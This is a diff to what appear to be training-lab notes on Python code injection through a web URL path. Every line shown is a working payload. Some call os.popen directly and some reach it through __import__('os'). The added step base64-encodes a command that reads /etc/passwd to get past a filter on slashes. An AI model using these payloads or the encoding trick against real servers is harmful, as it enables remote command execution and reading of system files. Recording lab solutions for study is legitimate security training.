@@ -22,3 +22,7 @@ http://yourwebsite.com/hello/%22%2bstr(os.popen('/usr/local/bin/').read())%2b%22
 4. If the OS module is not loaded, we can do the following:
 
 http://yourwebsite.com/hello/%22%2bstr(__import__('os').popen('/usr/local/bin/score%20f8eb195b-453d-4802-abfc-5ee5404b5a1a').read())%2b%22
+
+5. When / is not allowed we need to import base64
+
+ptl-4bfb3882-622712e7.libcurl.so/hello/hacker"%2bstr(__import__('os').popen(__import__('base64').b64decode('Y2F0IC9ldGMvcGFzc3dk')).read())%2b"
